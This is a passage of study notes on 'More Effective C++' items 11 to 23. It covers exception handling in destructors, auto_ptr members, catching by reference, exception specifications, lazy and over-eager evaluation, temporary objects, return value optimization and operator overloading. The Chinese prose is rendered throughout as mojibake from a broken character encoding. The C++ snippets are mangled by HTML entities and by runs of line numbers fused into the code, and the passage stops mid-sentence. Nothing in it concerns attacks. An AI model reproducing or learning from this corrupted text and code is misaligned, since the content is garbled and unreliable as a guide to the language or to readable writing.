ä¸ç”¨æ‹…å¿ƒèµ„æºæ³„æ¼ï¼Œè¿™ä¸ªå‡½æ•°ä¸ç”¨è¿›è¡Œå¼‚å¸¸å¤„ç†ã€‚Image * BookEntry::initImage(const string&amp; imageFileName) &#123; if (imageFileName != \"\") return new Image(imageFileName); else return 0;&#125;// theAudioClip è¢«ç¬¬äºŒä¸ªåˆå§‹åŒ–, æ‰€ä»¥å¦‚æœåœ¨ theAudioClip // åˆå§‹åŒ–è¿‡ç¨‹ä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œå®ƒå¿…é¡»ç¡®ä¿ theImage çš„èµ„æºè¢«é‡Šæ”¾ã€‚ // å› æ­¤è¿™ä¸ªå‡½æ•°ä½¿ç”¨ try...catch ã€‚ AudioClip * BookEntry::initAudioClip(const string&amp;, audioClipFileName)&#123; try &#123; if (audioClipFileName != \"\") return new AudioClip(audioClipFileName); else return 0; &#125; catch (...) &#123; delete theImage; throw; &#125;&#125; å¦‚æœä½ ä»¥ auto_ptr å¯¹è±¡æ¥å–ä»£ pointer class membersï¼Œå…é™¤äº†â€œexceptions å‡ºç°æ—¶å‘ç”Ÿèµ„æºæ³„æ¼â€çš„å±æœºï¼Œä¸å†éœ€è¦åœ¨ destructors å†…äº²è‡ªåŠ¨æ‰‹é‡Šæ”¾èµ„æºã€‚ 12345678910111213141516class BookEntry &#123; public: ...private: ... const auto_ptr&lt;Image&gt; theImage; const auto_ptr&lt;AudioClip&gt; theAudioClip; &#125;;BookEntry::BookEntry(const string&amp; name, const string&amp; address, const string&amp; imageFileName, const string&amp; audioClipFileName): theName(name), theAddress(address), theImage(imageFileName != \"\" ? new Image(imageFileName) : 0),theAudioClip(audioClipFileName != \"\" ? new AudioClip(audioClipFileName) : 0)&#123;&#125; æ¡æ¬¾ 11ï¼šç¦æ­¢å¼‚å¸¸ï¼ˆexceptionsï¼‰æµå‡ºdestructorsä¹‹å¤– ä¸¤ç§æƒ…å†µä¸‹ destructor ä¼šè¢«è°ƒç”¨ã€‚ ç¬¬ä¸€ç§æƒ…å†µæ˜¯å½“å¯¹è±¡åœ¨æ­£å¸¸çŠ¶æ€ä¸‹è¢«é”€æ¯ï¼Œä¹Ÿå°±æ˜¯å½“å®ƒç¦»å¼€äº†å®ƒçš„ç”Ÿå­˜ç©ºé—´ï¼ˆscopeï¼‰æˆ–æ˜¯è¢«æ˜ç¡®åœ°åˆ é™¤ï¼› ç¬¬äºŒç§æƒ…å†µæ˜¯å½“å¯¹è±¡è¢« exception å¤„ç†æœºåˆ¶é”€æ¯ï¼Œä¹Ÿå°±æ˜¯exception ä¼ æ’­è¿‡ç¨‹ä¸­çš„ stack-unwindingï¼ˆæ ˆå±•å¼€ï¼‰æœºåˆ¶ã€‚ å¦‚æœæ§åˆ¶æƒåŸºäº exception çš„å› ç´ ç¦»å¼€ destructorï¼Œè€Œæ­¤æ—¶æ­£æœ‰å¦ä¸€ä¸ª exception å¤„äºä½œç”¨çŠ¶æ€ï¼ŒC++ä¼šè°ƒç”¨ terminate å‡½æ•°ï¼Œå°†ä½ çš„ç¨‹åºç»“æŸæ‰ï¼Œç”šè‡³ä¸ç­‰å±€éƒ¨å¯¹è±¡è¢«é”€æ¯ã€‚ å…¨åŠ›é˜»æ­¢ exceptions ä¼ å‡º destructorsä¹‹å¤–ï¼š ç¬¬ä¸€ï¼Œå®ƒå¯ä»¥é¿å… terminate å‡½æ•°åœ¨ exception ä¼ æ’­è¿‡ç¨‹çš„æ ˆå±•å¼€ï¼ˆstack-unwindingï¼‰æœºåˆ¶ä¸­è¢«è°ƒç”¨ï¼› ç¬¬äºŒï¼Œå®ƒå¯ä»¥ååŠ©ç¡®ä¿ destructors å®Œæˆå…¶åº”è¯¥å®Œæˆçš„æ‰€æœ‰äº‹æƒ…ã€‚ æ¡æ¬¾ 12ï¼šäº†è§£â€œæŠ›å‡ºä¸€ä¸ªexceptionâ€ä¸â€œä¼ é€’ä¸€ä¸ªå‚æ•°â€æˆ–â€œè°ƒç”¨ä¸€ä¸ªè™šå‡½æ•°â€ä¹‹é—´çš„å·®å¼‚ ç¬¬ä¸€ï¼Œexception objects æ€»æ˜¯ä¼šè¢«å¤åˆ¶ï¼Œå¦‚æœä»¥ by value æ–¹å¼æ•æ‰ï¼Œå®ƒä»¬ç”šè‡³è¢«å¤åˆ¶ä¸¤æ¬¡ã€‚è‡³äºä¼ é€’ç»™å‡½æ•°å‚æ•°çš„å¯¹è±¡åˆ™ä¸ä¸€å®šå¾—å¤åˆ¶ã€‚ ç¬¬äºŒï¼Œâ€œè¢«æŠ›å‡ºæˆä¸º exceptionsâ€çš„å¯¹è±¡ï¼Œç›¸æ¯”äºâ€œè¢«ä¼ é€’åˆ°å‡½æ•°å»â€çš„å¯¹è±¡ï¼Œå…¶åˆæ³•çš„ç±»å‹è½¬æ¢æ›´å°‘ã€‚ ç¬¬ä¸‰ï¼Œcatch å­å¥ä»¥å…¶â€œå‡ºç°äºæºä»£ç çš„é¡ºåºâ€è¢«ç¼–è¯‘å™¨æ£€éªŒæ¯”å¯¹ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªåŒ¹é…æˆåŠŸè€…ä¾¿æ‰§è¡Œï¼›è€Œå½“æˆ‘ä»¬ä»¥æŸå¯¹è±¡è°ƒç”¨ä¸€ä¸ªè™šå‡½æ•°ï¼Œè¢«é€‰ä¸­æ‰§è¡Œçš„æ˜¯é‚£ä¸ªâ€œä¸å¯¹è±¡ç±»å‹æœ€ä½³å»åˆâ€çš„å‡½æ•°ï¼Œä¸è®ºå®ƒæ˜¯ä¸æ˜¯æºä»£ç æ‰€åˆ—çš„ç¬¬ä¸€ä¸ªã€‚ æ¡æ¬¾ 13ï¼šä»¥ by referenceæ–¹å¼æ•æ‰ exceptions å¦‚æœ catch by referenceï¼Œ å¯ä»¥é¿å¼€å¯¹è±¡åˆ é™¤é—®é¢˜ï¼› å¯ä»¥é¿å¼€ exception objects çš„åˆ‡å‰²ï¼ˆslicingï¼‰é—®é¢˜ï¼› å¯ä»¥ä¿ç•™æ•æ‰æ ‡å‡† exceptions çš„èƒ½åŠ›ï¼› çº¦æŸäº† exception objects éœ€è¢«å¤åˆ¶çš„æ¬¡æ•°ã€‚ 12345try &#123; ...&#125; catch (exception&amp; ex) &#123; ...&#125; æ¡æ¬¾ 14ï¼šæ˜æ™ºè¿ç”¨ exception specification 1234567void f1(); // å¯ä»¥æŠ›å‡ºä»»æ„çš„å¼‚å¸¸// exception specification å£°æ˜å…¶åªèƒ½æŠ›å‡º int ç±»å‹çš„å¼‚å¸¸void f2() throw(int) &#123; ... f1(); // å³ä½¿ f1 æŠ›å‡ºä¸æ˜¯ int ç±»å‹çš„å¼‚å¸¸ï¼Œä¹Ÿæ˜¯åˆæ³•çš„ ... &#125; ç»“è®ºæ˜¯ï¼š ä¸åº”è¯¥å°† templates å’Œ exception specifications æ··åˆä½¿ç”¨ã€‚ å¦‚æœA å‡½æ•°å†…è°ƒç”¨äº† B å‡½æ•°ï¼Œè€Œ B å‡½æ•°æ—  exception specificationsï¼Œé‚£ä¹ˆ A å‡½æ•°æœ¬èº«ä¹Ÿä¸è¦è®¾å®šexception specificationsã€‚ å¤„ç†â€œç³»ç»Ÿâ€å¯èƒ½æŠ›å‡ºçš„exceptionsã€‚å…¶ä¸­æœ€å¸¸è§çš„å°±æ˜¯ bad_allocï¼Œé‚£æ˜¯åœ¨å†…å­˜åˆ†é…å¤±è´¥æ—¶ç”±operator new å’Œ operator new[]æŠ›å‡ºçš„ã€‚ æ¡æ¬¾ 15ï¼šäº†è§£å¼‚å¸¸å¤„ç†ï¼ˆexception handlingï¼‰çš„æˆæœ¬ ä¸ºäº†èƒ½å¤Ÿåœ¨è¿è¡Œæ—¶æœŸå¤„ç† exceptionsï¼Œç¨‹åºå¿…é¡»åšå¤§é‡è®°å½•å·¥ä½œã€‚åœ¨æ¯ä¸€ä¸ªæ‰§è¡Œç‚¹ï¼Œå®ƒä»¬å¿…é¡»èƒ½å¤Ÿç¡®è®¤â€œå¦‚æœå‘ç”Ÿ exceptionï¼Œå“ªäº›å¯¹è±¡éœ€è¦ææ„â€ï¼Œå®ƒä»¬å¿…é¡»åœ¨æ¯ä¸€ä¸ª try è¯­å¥å—çš„è¿›å…¥ç‚¹å’Œç¦»å¼€ç‚¹åšè®°å·ï¼Œé’ˆå¯¹æ¯ä¸ª try è¯­å¥å—å®ƒä»¬å¿…é¡»è®°å½•å¯¹åº”çš„ catch å­å¥åŠèƒ½å¤Ÿå¤„ç†çš„ exceptions ç±»å‹ã€‚ try è¯­å¥å—ï¼Œæ— è®ºä½•æ—¶ä½¿ç”¨å®ƒï¼Œéƒ½å¾—ä¸ºæ­¤ä»˜å‡ºä»£ä»·ã€‚ä¸åŒçš„ç¼–è¯‘å™¨å®ç° try å—çš„æ–¹æ³•ä¸åŒï¼Œæ‰€ä»¥ç¼–è¯‘å™¨ä¸ç¼–è¯‘å™¨é—´çš„å¼€é”€ä¹Ÿä¸ä¸€æ ·ã€‚ç²—ç•¥åœ°ä¼°è®¡ï¼Œå¦‚æœä½ ä½¿ç”¨ try å—ï¼Œä»£ç å°†è†¨èƒ€5ï¼…ï¼10ï¼…å¹¶ä¸”è¿è¡Œé€Ÿåº¦ä¹ŸåŒæ¯”ä¾‹å‡æ…¢ã€‚exception specification é€šå¸¸ä¹Ÿæœ‰ä¸ try å—ä¸€æ ·å¤šçš„ç³»ç»Ÿå¼€é”€ã€‚ å¦‚æœæ˜¯å› ä¸ºå¼‚å¸¸è€Œå¯¼è‡´å‡½æ•°è¿”å›ï¼Œå‡½æ•°çš„æ‰§è¡Œé€Ÿåº¦é€šå¸¸ä¼šæ¯”æ­£å¸¸æƒ…å†µä¸‹æ…¢ 3 ä¸ªæ•°é‡çº§ã€‚å½“ç„¶ï¼Œåªæœ‰åœ¨æŠ›å‡º exception æ—¶æ‰ä¼šæ‰¿å—è¿™æ ·çš„å¼€é”€ã€‚ å››ã€æ•ˆç‡ æ¡æ¬¾ 16ï¼šè°¨è®° 80-20 æ³•åˆ™ 80-20 æ³•åˆ™è¯´ï¼šä¸€ä¸ªç¨‹åº 80%çš„èµ„æºç”¨äº 20%çš„ä»£ç èº«ä¸Šã€‚æ˜¯çš„ï¼Œ80%çš„æ‰§è¡Œæ—¶é—´èŠ±åœ¨å¤§çº¦ 20%çš„ä»£ç èº«ä¸Šï¼Œ80%çš„å†…å­˜è¢«å¤§çº¦ 20%çš„ä»£ç ä½¿ç”¨ï¼Œ80%çš„ç£ç›˜è®¿é—®åŠ¨ä½œç”± 20%çš„ä»£ç æ‰§è¡Œï¼Œ80%çš„ç»´æŠ¤åŠ›æ°”èŠ±åœ¨ 20%çš„ä»£ç ä¸Šé¢ã€‚ è½¯ä»¶çš„æ•´ä½“æ€§èƒ½å‡ ä¹æ€»æ˜¯ç”±ä»£ç çš„ä¸€å°éƒ¨åˆ†å†³å®šã€‚ æ¡æ¬¾ 17ï¼šè€ƒè™‘ä½¿ç”¨ lazy evaluationï¼ˆç¼“å¼è¯„ä¼°ï¼‰ lazy evaluationï¼ˆç¼“å¼è¯„ä¼°ï¼‰ã€‚å»¶ç¼“è¿ç®—ï¼Œç›´åˆ°é‚£äº›è¿ç®—ç»“æœåˆ»ä¸å®¹ç¼“åœ°è¢«è¿«åˆ‡éœ€è¦ä¸ºæ­¢ã€‚å¦‚æœå…¶è¿ç®—ç»“æœä¸€ç›´ä¸è¢«éœ€è¦ï¼Œè¿ç®—ä¹Ÿå°±ä¸€ç›´ä¸æ‰§è¡Œã€‚ åœ¨ä½ çœŸæ­£éœ€è¦ä¹‹å‰ï¼Œä¸å¿…ç€æ€¥ä¸ºæŸç‰©åšä¸€ä¸ªå‰¯æœ¬ã€‚åœ¨æŸäº›åº”ç”¨é¢†åŸŸï¼Œä½ å¸¸æœ‰å¯èƒ½æ°¸è¿œä¸éœ€è¦æä¾›é‚£æ ·ä¸€ä¸ªå‰¯æœ¬ã€‚ å®ç° lazy fetching æ—¶ï¼Œä½ å¿…é¡»é¢å¯¹ä¸€ä¸ªé—®é¢˜ï¼šnull æŒ‡é’ˆå¯èƒ½ä¼šåœ¨ä»»ä½• member functionsï¼ˆåŒ…æ‹¬const member functionsï¼‰å†…è¢«èµ‹å€¼ï¼Œä»¥æŒ‡å‘çœŸæ­£çš„æ•°æ®ã€‚ç„¶è€Œå½“ä½ ä¼å›¾åœ¨ const member functions å†…ä¿®æ”¹ data membersï¼Œç¼–è¯‘å™¨ä¸ä¼šåŒæ„ã€‚é™¤éå°†æŒ‡é’ˆå­—æ®µå£°æ˜ä¸º mutableã€‚ lazy evaluation åœ¨è®¸å¤šé¢†åŸŸä¸­éƒ½å¯èƒ½æœ‰ç”¨é€”ï¼šå¯é¿å…éå¿…è¦çš„å¯¹è±¡å¤åˆ¶ï¼Œå¯åŒºåˆ« operator[] çš„è¯»å–å’Œå†™åŠ¨ä½œï¼Œå¯é¿å…éå¿…è¦çš„æ•°æ®åº“è¯»å–åŠ¨ä½œï¼Œå¯é¿å…éå¿…è¦çš„æ•°å€¼è®¡ç®—åŠ¨ä½œã€‚ æ¡æ¬¾ 18ï¼šåˆ†æœŸæ‘Šè¿˜é¢„æœŸçš„è®¡ç®—æˆæœ¬ å¦ä¸€ç§æ”¹å–„è½¯ä»¶æ€§èƒ½çš„æ–¹æ³•æ˜¯ï¼šä»¤å®ƒè¶…å‰è¿›åº¦åœ°åšâ€œè¦æ±‚ä»¥å¤–â€çš„æ›´å¤šå·¥ä½œã€‚è¯¥æ–¹æ³•å¯ç§°ä¸ºè¶…æ€¥è¯„ä¼°ï¼ˆover-eager evaluationï¼‰ï¼šåœ¨è¢«è¦æ±‚ä¹‹å‰å°±å…ˆæŠŠäº‹æƒ…äº†ã€‚ Over-eager evaluation èƒŒåçš„è§‚å¿µæ˜¯ï¼Œå¦‚æœä½ é¢„æœŸç¨‹åºå¸¸å¸¸ä¼šç”¨åˆ°æŸä¸ªè®¡ç®—ï¼Œä½ å¯ä»¥é™ä½æ¯æ¬¡è®¡ç®—çš„å¹³å‡æˆæœ¬ï¼ŒåŠæ³•å°±æ˜¯è®¾è®¡ä¸€ä»½æ•°æ®ç»“æ„ä»¥ä¾¿èƒ½å¤Ÿææœ‰æ•ˆç‡åœ°å¤„ç†éœ€æ±‚ï¼Œæ¯”å¦‚å®æ—¶æ›´æ–°maxã€minç­‰å€¼ï¼Œå½“éœ€è¦ä½¿ç”¨æ—¶ç›´æ¥å–å€¼ï¼Œè€Œä¸ç”¨è®¡ç®—ã€‚ Caching æ˜¯â€œåˆ†æœŸæ‘Šè¿˜é¢„æœŸè®¡ç®—ä¹‹æˆæœ¬â€çš„ä¸€ç§åšæ³•ï¼ŒPrefetchingï¼ˆé¢„å…ˆå–å‡ºï¼‰åˆ™æ˜¯å¦ä¸€ç§åšæ³•ã€‚ è¿™äº›æ€æƒ³å¾ˆå¸¸è§å¾ˆæœ‰ç”¨ï¼Œcache è‡ªä¸ç”¨å¤šè¯´ã€‚å¯¹äº prefetchingï¼Œæ¯”å¦‚ï¼Œprefetchå†…å­˜æ•°æ®æ—¶ï¼Œæ€»æ˜¯æŒ‰é¡µå¤§å°è¿›è¡Œæˆå—å–æ•°æ®ï¼Œå±€éƒ¨æ€§åŸç†å‘Šè¯‰æˆ‘ä»¬ç›¸é‚»çš„æ•°æ®é€šå¸¸ä¼šæ›´å¯èƒ½è¢«éœ€è¦ã€‚æœ‰æ—¶å¯¹è±¡å¤ªå¤§è¶…è¿‡é¡µå¤§å°ï¼Œå°±ä¼šå¢åŠ æ¢é¡µæ´»åŠ¨ï¼Œç¼“å­˜å‘½ä¸­ç‡ä¸‹é™ï¼Œé€ æˆæ€§èƒ½æŸå¤±ã€‚ å¯é€šè¿‡over-eager evaluationï¼Œå¦‚ caching å’Œ prefetching ç­‰åšæ³•åˆ†æ‘Šé¢„æœŸè¿ç®—æˆæœ¬ï¼Œè¿™å’Œ lazy evaluation å¹¶ä¸çŸ›ç›¾ã€‚ å½“ä½ å¿…é¡»æ”¯æŒæŸäº›è¿ç®—è€Œå…¶ç»“æœå¹¶ä¸æ€»æ˜¯éœ€è¦çš„æ—¶å€™ï¼Œlazy evaluation å¯ä»¥æ”¹å–„ç¨‹åºæ•ˆç‡ã€‚ å½“ä½ å¿…é¡»æ”¯æŒæŸäº›è¿ç®—è€Œå…¶ç»“æœå‡ ä¹æ€»æ˜¯è¢«éœ€è¦ï¼Œæˆ–å…¶ç»“æœå¸¸å¸¸è¢«å¤šæ¬¡éœ€è¦çš„æ—¶å€™ï¼Œover-eager evaluation å¯ä»¥æ”¹å–„ç¨‹åºæ•ˆç‡ã€‚ æ¡æ¬¾ 19ï¼šäº†è§£ä¸´æ—¶å¯¹è±¡çš„æ¥æº C++ ä¸´æ—¶å¯¹è±¡æ˜¯ä¸å¯è§çš„ï¼Œä¸ä¼šåœ¨ä½ çš„æºä»£ç ä¸­å‡ºç°ã€‚åªè¦ä½ äº§ç”Ÿä¸€ä¸ª non-heap object è€Œæ²¡æœ‰ä¸ºå®ƒå‘½åï¼Œä¾¿è¯ç”Ÿäº†ä¸€ä¸ªä¸´æ—¶å¯¹è±¡ã€‚ è¿™ç§åŒ¿åå¯¹è±¡é€šå¸¸å‘ç”Ÿäºä¸¤ç§æƒ…å†µï¼šä¸€æ˜¯å½“éšå¼ç±»å‹è½¬æ¢ï¼ˆimplicit type conversionsï¼‰æ—¶äº§ç”Ÿï¼Œä»¥æ±‚å‡½æ•°è°ƒç”¨èƒ½å¤ŸæˆåŠŸï¼›äºŒæ˜¯å½“å‡½æ•°è¿”å›å¯¹è±¡çš„æ—¶å€™ã€‚ éšå¼ç±»å‹è½¬æ¢ 123456size_t countChar(const string&amp; str, char ch);...char buffer[MAX_STRING_LEN];char c;...int ret = countChar(buffer, c); çœ‹ä¸€ä¸‹ countChar çš„è°ƒç”¨ã€‚ç¬¬ä¸€ä¸ªè¢«ä¼ é€çš„å‚æ•°æ˜¯å­—ç¬¦æ•°ç»„ï¼Œä½†æ˜¯å¯¹åº”å‡½æ•°çš„æ­£è¢«ç»‘å®š çš„å‚æ•°çš„ç±»å‹æ˜¯ const string&amp;ã€‚ä»…å½“æ¶ˆé™¤ç±»å‹ä¸åŒ¹é…åï¼Œæ‰èƒ½æˆåŠŸè¿›è¡Œè¿™ä¸ªè°ƒç”¨ã€‚ ç¼–è¯‘å™¨ä¼šå»ºç«‹ä¸€ä¸ª string ç±»å‹çš„ä¸´æ—¶å¯¹è±¡ã€‚é€šè¿‡ä»¥ buffer åšä¸ºå‚æ•°è°ƒç”¨ string çš„æ„é€ å‡½æ•°æ¥åˆå§‹åŒ–è¿™ä¸ªä¸´æ—¶å¯¹è±¡ã€‚countChar çš„å‚æ•° str è¢«ç»‘å®šåœ¨è¿™ä¸ªä¸´æ—¶çš„ string å¯¹è±¡ä¸Šã€‚å½“ countChar è¿”å›æ—¶ï¼Œä¸´æ—¶å¯¹è±¡è‡ªåŠ¨é‡Šæ”¾ã€‚ ä»…å½“é€šè¿‡ä¼ å€¼ï¼ˆby valueï¼‰æ–¹å¼ä¼ é€’å¯¹è±¡ æˆ– ä¼ é€’å¸¸é‡å¼•ç”¨ï¼ˆreference-to-constï¼‰å‚æ•°æ—¶ï¼Œæ‰ä¼šå‘ç”Ÿè¿™äº›ç±»å‹è½¬æ¢ã€‚å½“ä¼ é€’ä¸€ä¸ªéå¸¸é‡å¼•ç”¨ï¼ˆreference-to-non-constï¼‰å‚æ•°å¯¹è±¡ï¼Œå°±ä¸ä¼šå‘ç”Ÿã€‚æ¯”å¦‚ï¼š 1234void uppercasify(string&amp; str);...char subtleBookPlug[] = \"Effective C++\"; uppercasify(subtleBookPlug); è¿™é‡Œå‡å¦‚äº§ç”Ÿä¸€ä¸ªä¸´æ—¶å¯¹è±¡ï¼Œuppercasifyä¼šå¯¹string&amp;æ‰€æŒ‡çš„ä¸´æ—¶å¯¹è±¡è¿›è¡Œä¿®æ”¹ï¼Œè€Œä¸æ˜¯å¯¹subtleBookPlugå­—ç¬¦æ•°ç»„è¿›è¡Œä¿®æ”¹ï¼Œæ˜¾ç„¶å’Œuppercasifyå‡½æ•°è®¾è®¡çš„æœ¬æ„æ˜¯ä¸ç¬¦åˆçš„ï¼Œè¿™æ˜¾ç„¶æ˜¯ä¸€ä¸ªé”™è¯¯ï¼Œå´ä¸æ˜“å¯Ÿè§‰ã€‚ æ‰€ä»¥ï¼ŒC++è¯­è¨€ç¦æ­¢ä¸ºéå¸¸é‡å¼•ç”¨ï¼ˆreference-to-non-constï¼‰ äº§ç”Ÿä¸´æ—¶å¯¹è±¡ã€‚ä»¥ä¸Šæƒ…å†µå¹¶ä¸ä¼šå‘ç”Ÿã€‚ å‡½æ•°è¿”å›å¯¹è±¡ 1const Number operator+(const Number&amp; lhs, const Number&amp; rhs); è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸´æ—¶çš„ï¼Œå› ä¸ºå®ƒæ²¡æœ‰è¢«å‘½åï¼Œå®ƒåªæ˜¯å‡½æ•°çš„è¿”å›å€¼ã€‚ä½ å¿…é¡»ä¸ºæ¯æ¬¡è°ƒç”¨operator+ æ„é€ å’Œé‡Šæ”¾è¿™ä¸ªå¯¹è±¡è€Œä»˜å‡ºä»£ä»·ã€‚æœ‰æ—¶å¯ä»¥é€šè¿‡ è¿”å›å€¼ä¼˜åŒ–ï¼ˆreturn value optimizationï¼‰å¯ä»¥å°†è¿™ä¸ªä¸´æ—¶å¯¹è±¡æ¶ˆç­æ‰ã€‚ æ€»ç»“ ä»»ä½•æ—¶å€™åªè¦ä½ çœ‹åˆ°ä¸€ä¸ª reference-to-const å‚æ•°ï¼Œå°±æå¯èƒ½ä¼šæœ‰ä¸€ä¸ªä¸´æ—¶å¯¹è±¡è¢«äº§ç”Ÿå‡ºæ¥ç»‘å®šè‡³è¯¥å‚æ•°ä¸Šã€‚ ä»»ä½•æ—¶å€™åªè¦ä½ çœ‹åˆ°å‡½æ•°è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œå°±ä¼šäº§ç”Ÿä¸´æ—¶å¯¹è±¡ï¼ˆå¹¶äºç¨åé”€æ¯ï¼‰ã€‚ æ¡æ¬¾ 20ï¼šååŠ©å®Œæˆâ€œè¿”å›å€¼ä¼˜åŒ–ï¼ˆRVOï¼‰â€ å¯ä»¥ç”¨æŸç§ç‰¹æ®Šå†™æ³•æ¥æ’°å†™å‡½æ•°ï¼Œä½¿å®ƒåœ¨è¿”å›å¯¹è±¡æ—¶ï¼Œèƒ½å¤Ÿè®©ç¼–è¯‘å™¨æ¶ˆé™¤ä¸´æ—¶å¯¹è±¡çš„æˆæœ¬ã€‚ æ–¹æ³•æ˜¯ï¼šè¿”å› constructor arguments ä»¥å–ä»£å¯¹è±¡ã€‚ 123456789101112// é”™è¯¯æ–¹æ³•const Rational&amp; operator*(const Rational&amp; lhs, const Rational&amp; rhs) &#123; Rational result(lhs.numerator() * rhs.numerator(), lhs.denominator() * rhs.denominator()); return result; // è¿”å›æ—¶ï¼Œå…¶æŒ‡å‘çš„å¯¹è±¡å·²ç»ä¸å­˜åœ¨äº† &#125;// æ­£ç¡®æ–¹æ³•const Rational operator*(const Rational&amp; lhs, const Rational&amp; rhs) &#123; return Rational(lhs.numerator() * rhs.numerator(), lhs.denominator() * rhs.denominator());&#125; è™½ç„¶ä»æ—§å¿…é¡»ä¸ºåœ¨å‡½æ•°å†…ä¸´æ—¶å¯¹è±¡çš„æ„é€ å’Œé‡Šæ”¾è€Œä»˜å‡ºä»£ä»·ã€‚ä½†æ˜¯æ­¤æ—¶ï¼Œç¼–è¯‘å™¨å¯ä»¥è¿›è¡Œä¼˜åŒ–äº†ã€‚ 1Rational c = a * b; ç¼–è¯‘å™¨ä¼šæ¶ˆé™¤åœ¨ operator* å†…çš„ä¸´æ—¶å˜é‡å’Œ operator* è¿”å›çš„ä¸´æ—¶å˜é‡ã€‚ç›´æ¥åœ¨ c çš„å†…å­˜é‡Œæ„é€  return è¡¨è¾¾å¼å®šä¹‰çš„å¯¹è±¡ã€‚è°ƒç”¨ operator* çš„ä¸´æ—¶å¯¹è±¡çš„å¼€é”€å°±æ˜¯é›¶ï¼šæ²¡æœ‰å»ºç«‹ä¸´æ—¶å¯¹è±¡ã€‚ åˆ©ç”¨å‡½æ•°çš„ return ç‚¹æ¶ˆé™¤ä¸€ä¸ªå±€éƒ¨ä¸´æ—¶å¯¹è±¡ï¼Œè¿™ç§æ–¹æ³•å¾ˆå¸¸è§ï¼Œè¢«ç§°ä¹‹ä¸º return value optimizationã€‚ æ¡æ¬¾ 21ï¼šåˆ©ç”¨é‡è½½æŠ€æœ¯ï¼ˆoverloadï¼‰é¿å…éšå¼ç±»å‹è½¬æ¢ï¼ˆimplicit type conversionï¼‰ åœ¨é‡è½½æ“ä½œç¬¦æ—¶ï¼Œæ¯ä¸ªé‡è½½å‡½æ•°çš„å‚æ•°å¿…é¡»è‡³å°‘ä¸€ä¸ªæ˜¯â€œç”¨æˆ·å®šåˆ¶ç±»å‹â€çš„è‡ªå˜é‡ã€‚å¦‚æœä¸æ˜¯ï¼Œå°±ä¼šæ”¹å˜C++å†…éƒ¨é¢„å…ˆå®šä¹‰çš„æ“ä½œç¬¦æ„ä¹‰ï¼ˆå‚æ•°ç±»å‹å…¨æ˜¯å†…ç½®ç±»å‹ï¼‰ï¼Œè€Œé‚£å½“ç„¶ä¼šå¯¼è‡´å¤©ä¸‹å¤§ä¹±ã€‚ 12345678910// åˆç†çš„è®¾è®¡const UPInt operator+(const UPInt&amp; lhs, const UPInt&amp; rhs);const UPInt operator+(const UPInt&amp; lhs, int rhs);const UPInt operator+(int lhs, const UPInt&amp; rhs);// é”™è¯¯const UPInt operator+(int lhs, int rhs); å¢åŠ ä¸€å †é‡è½½å‡½æ•°ä¸ä¸€å®šæ˜¯å¥½äº‹ï¼Œé™¤éèƒ½ä¿è¯è¿™æ ·å¯¹ç¨‹åºæ•ˆç‡æœ‰å¾ˆå¤§çš„æ”¹å–„ã€‚ æ¡æ¬¾ 22ï¼šè€ƒè™‘ä»¥æ“ä½œç¬¦å¤åˆå½¢å¼ï¼ˆop=ï¼‰å–ä»£å…¶ç‹¬èº«å½¢å¼ï¼ˆopï¼‰ ä¸€ä¸ªå¥½æ–¹æ³•å°±æ˜¯ä»¥å¤åˆå½¢å¼ï¼ˆä¾‹å¦‚ï¼Œoperator+=ï¼‰ä¸ºåŸºç¡€å®ç°ç‹¬èº«å½¢å¼ï¼ˆä¾‹å¦‚ï¼Œoperator+ï¼‰ã€‚ 3 ä¸ªä¸æ•ˆç‡æœ‰å…³çš„æƒ…å†µå€¼å¾—æ³¨æ„ã€‚ ç¬¬ä¸€ï¼Œä¸€èˆ¬è€Œè¨€ï¼Œå¤åˆæ“ä½œç¬¦æ¯”å…¶å¯¹åº”çš„ç‹¬èº«ç‰ˆæœ¬æ•ˆç‡é«˜ã€‚å› ä¸ºç‹¬èº«ç‰ˆæœ¬é€šå¸¸å¿…é¡»è¿”å›ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œè€Œæˆ‘ä»¬å¿…é¡»å› æ­¤è´Ÿæ‹…ä¸€ä¸ªä¸´æ—¶å¯¹è±¡çš„æ„é€ å’Œææ„æˆæœ¬ï¼ˆè§æ¡æ¬¾ 19å’Œ 20ï¼‰ã€‚å¤åˆç‰ˆæœ¬åˆ™æ˜¯ç›´æ¥å°†ç»“æœå†™å…¥å…¶å·¦ç«¯è‡ªå˜é‡ï¼Œæ‰€ä»¥ä¸éœ€è¦äº§ç”Ÿä¸€ä¸ªä¸´æ—¶å¯¹è±¡æ¥æ”¾ç½®è¿”å›å€¼ã€‚ ç¬¬äºŒï¼Œå¦‚æœåŒæ—¶æä¾›æŸä¸ªæ“ä½œç¬¦çš„å¤åˆå½¢å¼å’Œç‹¬èº«å½¢å¼ï¼Œé‚£å°±æ˜¯åœ¨å…è®¸ä½ çš„å®¢æˆ·åœ¨æ•ˆç‡ä¸ä¾¿åˆ©æ€§ä¹‹é—´è‡ªè¡Œå–èˆã€‚ ç¬¬ä¸‰ã€åŒ¿åå¯¹è±¡æ€»æ˜¯æ¯”å‘½åå¯¹è±¡æ›´å®¹æ˜“è¢«æ¶ˆé™¤ï¼Œæ‰€ä»¥å½“ä½ é¢ä¸´å‘½åå¯¹è±¡æˆ–ä¸´æ—¶å¯¹è±¡çš„æŠ‰æ‹©æ—¶ï¼Œæœ€å¥½é€‰æ‹©ä¸´æ—¶å¯¹è±¡ã€‚åŒ¿åå¯¹è±¡æœ‰å¯èƒ½é™ä½æˆæœ¬ï¼ˆå°¤å…¶åœ¨æ­é…æ—§å¼ç¼–è¯‘å™¨æ—¶ï¼‰ã€‚ æ¡æ¬¾ 23ï¼šè€ƒè™‘ä½¿ç”¨å…¶ä»–ç¨‹åºåº“ ä¸åŒçš„ç¨‹åºåº“å³ä½¿æä¾›ç›¸ä¼¼çš„åŠŸèƒ½ï¼Œä¹Ÿå¾€å¾€æœ‰ä¸åŒçš„æ€§èƒ½å–èˆç­–ç•¥ï¼Œæ‰€ä»¥ä¸€æ—¦ä½ æ‰¾å‡ºç¨‹åºçš„ç“¶é¢ˆï¼Œä½ åº”è¯¥æ€è€ƒæ˜¯å¦æœ‰å¯èƒ½ä½¿ç”¨å…¶ä»–ç¨‹åºåº“ï¼Œæ¥ç§»é™¤äº†é‚£äº›ç“¶é¢ˆã€‚ æ¯”å¦‚ï¼Œiostream ç›¸æ¯”äº stdioï¼Œiostream 